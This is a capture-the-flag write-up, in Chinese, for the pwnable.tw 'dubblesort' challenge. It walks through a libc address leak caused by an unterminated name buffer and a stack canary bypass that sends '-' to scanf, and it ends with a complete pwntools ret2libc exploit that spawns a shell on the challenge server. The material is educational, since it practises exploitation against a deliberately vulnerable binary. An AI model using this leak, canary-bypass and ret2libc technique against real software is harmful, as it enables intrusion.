# Challenges 100 Week 6



|      Challenges       |  Tricks  |
| :-------------------: | :------: |
| pwnable.tw-dubblesort | `canary` |

新年快乐！没想到吧！春节我也不消停...不过做题的速度要变慢了，Sakura师傅还要交这周的作业，下周放一个假，打算把how2heap学完，做点例题。

<!--more-->

# dubblesort

这个出题人的英文是不是不太好？

## checksec

```shell
[*] '/home/niebelungen/Desktop/pwnable.tw/dubblesort/dubblesort'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

所有保护全开。

## ida

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int count; // eax
  unsigned int *v4; // edi
  unsigned int i; // esi
  unsigned int j; // esi
  int result; // eax
  unsigned int _count; // [esp+18h] [ebp-74h] BYREF
  unsigned int num[8]; // [esp+1Ch] [ebp-70h] BYREF
  char buf[64]; // [esp+3Ch] [ebp-50h] BYREF
  unsigned int v11; // [esp+7Ch] [ebp-10h]

  v11 = __readgsdword(0x14u);
  init();
  __printf_chk(1, (int)"What your name :");
  read(0, buf, 0x40u);
  __printf_chk(1, (int)"Hello %s,How many numbers do you what to sort :");
  __isoc99_scanf("%u", &_count);
  count = _count;
  if ( _count )
  {
    v4 = num;
    for ( i = 0; i < _count; ++i )
    {
      __printf_chk(1, (int)"Enter the %d number : ");
      fflush(stdout);
      __isoc99_scanf("%u", v4);
      count = _count;
      ++v4;
    }
  }
  bubblesort(num, count);
  puts("Result :");
  if ( _count )
  {
    for ( j = 0; j < _count; ++j )
      __printf_chk(1, (int)"%u ");
  }
  result = 0;
  if ( __readgsdword(0x14u) != v11 )
    check_canary();
  return result;
```

程序看上去是没有任何问题，漏洞在程序函数的实现上。

使用`read`函数读取的`buf`是用`\x0a`进行截断的。而`printf`在输出字符串的时候是用`\x00`进行截断，所以可以用来泄露栈上的内容。而通过输入数字的数量我们可以实现栈溢出。

在我们输入的字符串的附近：

```shell
0f:003c│ ecx esi  0xffffcdac ◂— 'aaaabbbb\n'
10:0040│          0xffffcdb0 ◂— 'bbbb\n'
11:0044│          0xffffcdb4 ◂— 0xa /* '\n' */
12:0048│          0xffffcdb8 —▸ 0x56555034 ◂— push   es
13:004c│          0xffffcdbc ◂— 0x16
14:0050│          0xffffcdc0 ◂— 0x8000
15:0054│          0xffffcdc4 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
```

有一个(\_GLOBAL_OFFSET_TABLE_)，明显它的地址的libc中的，查看它在libc中的偏移。

```shell
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
0x56555000 0x56556000 r-xp     1000 0      /home/niebelungen/Desktop/pwnable.tw/dubblesort/dubblesort
0x56556000 0x56557000 r--p     1000 0      /home/niebelungen/Desktop/pwnable.tw/dubblesort/dubblesort
0x56557000 0x56558000 rw-p     1000 1000   /home/niebelungen/Desktop/pwnable.tw/dubblesort/dubblesort
0xf7e01000 0xf7e02000 rw-p     1000 0      
0xf7e02000 0xf7fb2000 r-xp   1b0000 0      /lib/i386-linux-gnu/libc-2.23.so
0xf7fb2000 0xf7fb3000 ---p     1000 1b0000 /lib/i386-linux-gnu/libc-2.23.so
0xf7fb3000 0xf7fb5000 r--p     2000 1b0000 /lib/i386-linux-gnu/libc-2.23.so
0xf7fb5000 0xf7fb6000 rw-p     1000 1b2000 /lib/i386-linux-gnu/libc-2.23.so
```

0xf7fb5000-0xf7e02000=0x1b3000，这里我们加载的是本地libc所以查看libc的节信息。

```shell
  [32] .got.plt          PROGBITS        001b3000 1b2000 000030 04  WA  0   0  4
```

其为`.got.plt`节，再查看服务器上libc的偏移

```shell
  [31] .got.plt          PROGBITS        001b0000 1af000 000030 04  WA  0   0  4
```

> .got
>
> This is the GOT, or Global Offset Table. This is the actual table of offsets as filled in by the linker for external symbols.
>
> .plt
>
> This is the PLT, or Procedure Linkage Table. These are stubs that look up the addresses in the `.got.plt` section, and either jump to the right address, or trigger the code in the linker to look up the address. (If the address has not been filled in to `.got.plt` yet.)
>
> .got.plt
>
> This is the GOT for the PLT. It contains the target addresses (after they have been looked up) or an address back in the `.plt` to trigger the lookup. Classically, this data was part of the `.got` section.


```assembly
.text:00000AF9                 mov     eax, 0
.text:00000AFE                 mov     edx, [esp+7Ch]
.text:00000B02                 xor     edx, large gs:14h
.text:00000B09                 jz      short loc_B10
.text:00000B0B                 call    check_canary
```

经过调试，发现canary被放入了`esp+0x7c`的位置。因为会进行排序，而为了修改返回地址，我们会遇到canary。所以在canary前输入比其小的数字‘0’，通过输入符号绕过canary，之后输入比canary大的内容。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher

leak = lambda name,addr: log.success('{:#x}'.format(name,addr))
context.log_level="DEBUG"
context.arch="amd64"

local=0
binary='./dubblesort'
#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('chall.pwnable.tw',10101)

elf = ELF(binary,checksec=False)
libc=ELF('./libc_32.so.6',checksec=False)
p.sendline('a'*0x18)

libcbase=u32(p.recvuntil('\xf7')[-4:])-0xa-0x1b0000
print hex(libcbase)
system=libcbase+libc.symbols['system']
bin_sh=libcbase+0x00158e8b

p.sendline('35')
payload='0'*0x18+'-'+9*str(system)+str(bin_sh)

for i in range(24):
    p.sendline('0')
    
p.sendline('-')
for i in range(9):
    p.sendline(str(system))

p.sendline(str(bin_sh))

p.interactive()
```


